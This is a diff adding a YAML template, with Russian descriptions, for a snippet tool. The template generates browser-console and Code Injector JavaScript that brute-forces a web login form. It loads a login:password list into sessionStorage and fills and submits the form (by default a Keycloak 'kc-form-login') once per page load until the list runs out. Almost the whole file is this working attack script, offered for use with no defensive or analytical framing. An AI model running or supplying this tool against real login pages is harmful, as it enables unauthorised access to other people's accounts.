@@ -1,0 +1,59 @@
+description: >-
+  Брут с помощью firefox и codeinjector
+
+author: vinzekatze
+tags:
+  - firefox
+  - bruteforce
+
+arguments:
+  creds:
+    description: файл с кредами (список в формате "логин:пароль")
+  
+  l:
+    default: username
+    description: ID поля ввода c логином
+    replacer: "#login#"
+  p:
+    default: password
+    description: ID поля ввода с паролем
+    replacer: "#password#"
+  f:
+    default: kc-form-login
+    description: ID формы, которую будем submit-идь
+    replacer: "#form-name#"
+
+mode:
+  format:
+    creds: '{!r}'
+    l: '{!r}'
+    p: '{!r}'
+    f: '{!r}'
+
+shell: bash
+script: |-
+  echo "// ВЫПОЛНИТЬ В КОНСОЛЕ БРАУЗЕРА"
+  echo "var wordlist = "$(for i in $(cat #creds#); do echo -n $i | base64; done | jq -R -s -c -M 'split("\n")')
+  echo "sessionStorage.setItem('1_PassNum', 1);"
+  echo "sessionStorage.setItem('1_PassListLength', wordlist.length);"
+  echo "for (var i = 1; i <= wordlist.length; i++) {sessionStorage.setItem('pwd'+i, atob(wordlist[i-1]))};"
+  echo
+  echo
+  echo
+  echo "// В CODE INJECTOR"
+  echo "var VarPassNum = Number(sessionStorage.getItem('1_PassNum'));"
+  echo "var VarPassListLength = Number(sessionStorage.getItem('1_PassListLength'));"
+  echo "var login_inj = sessionStorage.getItem('pwd' + VarPassNum).split(/:(.+)/).slice(0, 2)[0];"
+  echo "var pass_inj = sessionStorage.getItem('pwd' + VarPassNum).split(/:(.+)/).slice(0, 2)[1];"
+  echo "setTimeout(function(){if (VarPassNum <= VarPassListLength) {"
+  echo "  document.getElementById(#login#).value = login_inj;"
+  echo "  document.getElementById(#password#).value = pass_inj;"
+  echo "  sessionStorage.setItem('1_PassNum', Number(VarPassNum)+1);"
+  echo "  sessionStorage.setItem('0_LAST_PASS', pass_inj);"
+  echo "  document.getElementById(#form-name#).submit();"
+  echo "}}, 100);"
+
+
+
+
+  
